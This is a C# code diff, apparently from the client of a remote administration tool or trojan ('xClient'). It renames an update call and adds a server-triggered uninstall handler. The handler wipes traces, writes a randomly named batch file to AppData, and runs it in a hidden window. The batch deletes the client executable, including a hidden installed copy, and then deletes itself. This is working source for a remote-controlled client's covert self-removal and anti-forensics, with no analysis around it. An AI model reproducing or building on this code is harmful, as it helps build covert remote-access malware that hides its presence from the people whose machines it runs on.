@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Threading;
@@ -43,7 +44,7 @@ namespace xClient.Core.Commands
                     {
                         new Packets.ClientPackets.Status("Updating...").Execute(client);
 
-                        SystemCore.Update(client, filePath);
+                        SystemCore.UpdateClient(client, filePath);
                     }
                 }
                 catch (Exception ex)
@@ -78,8 +79,49 @@ namespace xClient.Core.Commands
 
                 new Packets.ClientPackets.Status("Updating...").Execute(client);
 
-                SystemCore.Update(client, tempFile);
+                SystemCore.UpdateClient(client, tempFile);
             }).Start();
+        }
+
+        public static void HandleUninstall(Packets.ServerPackets.Uninstall command, Client client)
+        {
+            new Packets.ClientPackets.Status("Uninstalling... bye ;(").Execute(client);
+
+            SystemCore.RemoveTraces();
+
+            try
+            {
+                string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                    Helper.Helper.GetRandomFilename(12, ".bat"));
+
+                string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
+                    ? "@echo off" + "\n" +
+                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
+                      "ping -n 20 localhost > nul" + "\n" +
+                      "del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
+                      "del " + "\"" + filename + "\""
+                    : "@echo off" + "\n" +
+                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
+                      "ping -n 20 localhost > nul" + "\n" +
+                      "del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
+                      "del " + "\"" + filename + "\""
+                    ;
+
+                File.WriteAllText(filename, uninstallBatch);
+                ProcessStartInfo startInfo = new ProcessStartInfo
+                {
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true,
+                    UseShellExecute = true,
+                    FileName = filename
+                };
+                Process.Start(startInfo);
+            }
+            finally
+            {
+                SystemCore.Disconnect = true;
+                client.Disconnect();
+            }
         }
     }
 }
